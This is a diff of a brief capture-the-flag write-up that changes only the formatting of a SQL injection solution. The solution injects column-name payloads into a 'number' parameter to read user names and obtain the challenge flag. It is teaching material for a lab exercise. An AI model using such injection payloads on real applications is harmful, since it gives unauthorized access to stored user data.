@@ -12,15 +12,15 @@ Second instance running at 52.90.229.46:8558
 
 ```
 # Solve
-This is a normal query: `SELECT `1` FROM users WHERE name = 'custom-kevin';`
+This is a normal query: ```SELECT `1` FROM users WHERE name = 'custom-kevin';```
 
 There are three parameters: `number`, `value` and `action`
 
 We will inject into `number` parameter and try to display name of users
 
-payload: `name` FROM users LIMIT 1 OFFSET 0-- -`
+payload: ```name` FROM users LIMIT 1 OFFSET 0-- -```
 and we get `custom-Hi`, let try another
-payload: `name` FROM users LIMIT 1 OFFSET 1-- -` and we got the flag
+payload: ```name` FROM users LIMIT 1 OFFSET 1-- -``` and we got the flag
 
 # Flag
 flag{aLW4ys_ESC4PE_3v3rYTH1NG!!!!!}
